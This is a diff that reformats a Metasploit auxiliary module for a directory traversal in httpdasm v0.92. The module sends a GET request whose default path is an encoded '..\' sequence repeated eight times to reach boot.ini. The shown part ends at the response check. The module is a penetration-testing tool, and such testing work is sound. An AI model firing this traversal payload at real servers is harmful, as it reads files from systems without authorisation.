@@ -7,34 +7,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Httpdasm Directory Traversal',
-      'Description'    => %q{
-        This module allows for traversing the file system of a host running httpdasm v0.92.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Httpdasm Directory Traversal',
+        'Description' => %q{
+          This module allows for traversing the file system of a host running httpdasm v0.92.
+        },
+        'Author' => [
           'John Leitch', # EDB POC
           'Shelby Pace' # Metasploit Module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['EDB', '15861']
         ]
-    ))
+      )
+    )
 
     register_options(
-    [
-      OptString.new('TARGETURI', [true, 'Path to traverse to', '%2e%2e%5c' * 8 + 'boot.ini'])
-    ])
-
+      [
+        OptString.new('TARGETURI', [true, 'Path to traverse to', '%2e%2e%5c' * 8 + 'boot.ini'])
+      ]
+    )
   end
 
   def run
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri.path)
+      'uri' => normalize_uri(target_uri.path)
     })
 
     if res && res.code == 200
